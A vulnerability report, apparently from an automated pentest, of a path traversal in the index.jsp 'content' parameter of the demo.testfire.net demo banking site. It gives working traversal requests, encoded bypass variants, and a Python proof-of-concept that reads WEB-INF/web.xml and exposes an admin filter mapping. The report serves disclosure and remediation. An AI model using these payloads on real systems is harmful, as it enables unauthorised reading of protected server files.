# Unauthenticated path traversal in the index.jsp `content` parameter allows reading protected WEB-INF deployment files

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-09-20 21:45:12 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /index.jsp
**Method:** GET
**CWE:** CWE-22
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

The `content` parameter of `/index.jsp` is used to select a file to include without validating that the resolved path stays inside the intended `/static/` content directory. An unauthenticated attacker can supply `../` sequences to escape that directory and read files that are protected by the Servlet specification (for example `/WEB-INF/web.xml`), disclosing the application's full deployment descriptor, servlet/filter classes and URL mappings.

## Evidence

Raw request/response for the traversal (unauthenticated, no cookies sent):

```http
GET /index.jsp?content=../WEB-INF/web.xml HTTP/1.1
Host: demo.testfire.net

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=06E24EB82D049449CF5538FB67F25061; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 14141
```

The response body embeds the real deployment descriptor (7380 bytes between `<web-app>` and `</web-app>`); excerpt showing filter configuration, including the mistyped admin path:

```xml
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" ... version="2.5">
  <display-name>Altoro Mutual</display-name>
  <error-page>
    <error-code>404</error-code>
    <location>/notfound.jsp</location>
  </error-page>
  <listener>
      <listener-class>com.ibm.security.appscan.altoromutual.listener.StartupListener</listener-class>
  </listener>
  ...
  <filter-mapping>
    <filter-name>AdminFilter</filter-name>
    <url-pattern>/adimn/*</url-pattern>
    ...
  </filter-mapping>
  ...
</web-app>
```

Negative controls on the same endpoint (the input is reported verbatim as an unresolvable resource, proving the `../` is what enables the read and that the app does not intentionally serve `WEB-INF`):

```http
GET /index.jsp?content=WEB-INF/web.xml        -> "Failed due to The requested resource (/static/WEB-INF/web.xml) is not available"
GET /index.jsp?content=../WEB-INF/does-not-exist.xml -> "Failed due to The requested resource (/static/../WEB-INF/does-not-exist.xml) is not available"
```

Encoded traversal variants return the same 14141-byte descriptor:

```
content=..%2fWEB-INF/web.xml            -> 14141 bytes, descriptor present
content=%2e%2e%2fWEB-INF/web.xml        -> 14141 bytes, descriptor present
content=..%5cWEB-INF/web.xml            -> 14141 bytes, descriptor present
```

A second protected file was also read to confirm generality of the primitive: `content=../META-INF/MANIFEST.MF` returns the file content (`Manifest-Version: 1.0`).

## Impact

An unauthenticated remote attacker can read arbitrary resources that reside inside the deployed web application, including the protected `WEB-INF` tree (`WEB-INF/web.xml`, `META-INF/MANIFEST.MF`, and other server-side configuration/source artifacts shipped in the package). The leak of `web.xml` exposes the entire security configuration of the application — every filter and servlet class, their URL mappings and error pages — which directly reveals the access-control misconfiguration (`AdminFilter` bound only to the mistyped path `/adimn/*`) that lets any authenticated user reach administrative functions, and gives the internal endpoint/class inventory needed to target further attacks. No authentication or user interaction is required.

## Counterevidence

Actively tested alternate explanations and found none that hold. (1) "It is just echoing a template / a fixed page" — disproved: the controls `content=WEB-INF/web.xml` and `content=../WEB-INF/does-not-exist.xml` both return `not available`, and the traversal response carries the app's real `<web-app>` descriptor with unique servlet/filter classes and `</web-app>` terminator (7380 bytes of live file content). (2) "Only whitelisted filenames are served" — disproved: two distinct protected files were read (`WEB-INF/web.xml`, `META-INF/MANIFEST.MF`) and the error text echoes the attacker-supplied resolved path, showing the parameter drives path resolution. (3) "It escapes the whole server, so it must reach OS secrets" — on the contrary, deeper traversal (`../../…`) raises a `NullPointerException` because the container clamps the path at the web application root; the read is therefore confined to the deployed application, which limits (rather than invalidates) severity. (4) "Authentication is required" — disproved: reproduced with no cookies and a freshly issued session. No WAF, input filter, or allow-list was observed on this path. The remaining uncertainty is only how much sensitive material any particular deployment ships under `WEB-INF`; the primitive itself is fully confirmed.

## What Would Change This Severity

If the traversal were demonstrated to reach files outside the web application root (host `/etc/passwd`, Tomcat `conf/tomcat-users.xml`, or credential-bearing database configuration), the impact would rise to critical; conversely, if the deployment were configured to deny `RequestDispatcher` access to `WEB-INF`/`META-INF` or the `content` value were constrained to an allow-list, the finding would drop to low.

## Technical Analysis

The main page `index.jsp` renders a body selected by the `content` request parameter. Internally the value is turned into a context-relative path prefixed with the public content directory and forwarded/included through a `RequestDispatcher` (observable because error responses are emitted as `Failed due to The requested resource (/static/<input>) is not available`). Because the value is not canonicalised against the base directory, `../` segments traverse out of `/static/`.

`GET /index.jsp?content=../WEB-INF/web.xml` resolves to `/static/../WEB-INF/web.xml` → `/WEB-INF/web.xml` and includes the raw deployment descriptor, which the Servlet specification requires to be inaccessible to clients. That the returned bytes are genuine file content (and not a template or a static page) is confirmed by comparing three behaviours on the same endpoint:

- `content=../WEB-INF/web.xml` → HTTP 200, 14141 bytes, body contains the real `<web-app ...> … </web-app>` descriptor including `AuthFilter`/`AdminFilter` classes and the mistyped `/adimn/*` mapping.
- `content=WEB-INF/web.xml` (no traversal) → the requested path is reported as `not available`, proving the app does not serve `WEB-INF` by design and that the `../` is what enables the read.
- `content=../WEB-INF/does-not-exist.xml` → `not available`, proving the parameter resolves real files rather than emitting a fixed template.

URL- and separator-encoded payloads (`..%2f`, `%2e%2e%2f`, `..%5c`) return the same 14141-byte content, indicating the value is decoded before path resolution. Deeper traversal (`../../WEB-INF/web.xml`) raises a `NullPointerException` (`org.apache.jasper.JasperException`) because Tomcat clamps the normalised path at the web application root, so the read is bounded to the deployed application (web root plus `WEB-INF`/`META-INF`) and does not reach the host OS filesystem.

## Proof of Concept

1. From an unauthenticated client (no cookies/session), request `GET http://demo.testfire.net/index.jsp?content=../WEB-INF/web.xml`.
2. Observe HTTP 200 with `Content-Length: 14141`; the response body embeds the application's real deployment descriptor (`<web-app …>` through `</web-app>`).
3. Confirm this is real file content and not a template by comparing controls on the same endpoint: `content=WEB-INF/web.xml` (no traversal) and `content=../WEB-INF/does-not-exist.xml` both return `Failed due to The requested resource (…) is not available`.
4. Confirm encoding bypasses by requesting `content=..%2fWEB-INF/web.xml`, `content=%2e%2e%2fWEB-INF/web.xml` and `content=..%5cWEB-INF/web.xml`, all of which return the same descriptor.
5. Read the leaked descriptor to extract filter/servlet mappings, including `AdminFilter` bound to the mistyped `/adimn/*` path.

```python
import urllib.request
import urllib.parse

BASE = "http://demo.testfire.net"

def fetch(content):
    url = BASE + "/index.jsp?content=" + urllib.parse.quote(content, safe="")
    with urllib.request.urlopen(urllib.request.Request(url), timeout=15) as r:
        return r.read().decode("ISO-8859-1", "replace")

# Negative controls: prove the parameter resolves real files, not a template/whitelist
print("[control] content=WEB-INF/web.xml -> not available:",
      "not available" in fetch("WEB-INF/web.xml"))
print("[control] content=../WEB-INF/does-not-exist.xml -> not available:",
      "not available" in fetch("../WEB-INF/does-not-exist.xml"))

# The traversal
body = fetch("../WEB-INF/web.xml")
print("[+] response length:", len(body))
start = body.find("<web-app")
end = body.find("</web-app>") + len("</web-app>")
descriptor = body[start:end]
print("[+] extracted deployment descriptor bytes:", len(descriptor))
print("[+] reveals AdminFilter typo mapping (/adimn/*):",
      "<url-pattern>/adimn/*</url-pattern>" in descriptor)

# Encoded variants
for enc in ["..%2fWEB-INF/web.xml", "%2e%2e%2fWEB-INF/web.xml", "..%5cWEB-INF/web.xml"]:
    with urllib.request.urlopen(BASE + "/index.jsp?content=" + enc, timeout=15) as r:
        data = r.read().decode("ISO-8859-1", "replace")
    print("[+] encoded variant", enc, "-> bytes:", len(data),
          "| descriptor present:", "<web-app" in data)
```

## Remediation

Do not build a servlet-internal path directly from user input. Resolve the requested resource against a fixed base directory and then verify that the canonicalised result still begins with that base directory before forwarding/including it; reject the request otherwise. Because the value is resolved by the servlet container, apply the check after normalisation so that encoded traversal sequences (`..%2f`, `%2e%2e%2f`, backslashes) are also covered. Prefer serving the parameter as a fixed, server-side allow-list of known content keys mapped to resources rather than a free-form path, and keep all configuration and class resources under `WEB-INF`/`META-INF` where the container already restricts direct access.

## Assumptions

The application is deployed on a servlet container that resolves `..` segments in `RequestDispatcher` paths (observed: Apache Tomcat 7.0.92). The impact is bounded to resources inside the deployed web application (web root, `WEB-INF`, `META-INF`); traversal above the context root fails. The deployed descriptor observed did not contain credential values, but the same primitive would read any credential-bearing file shipped in the application package.
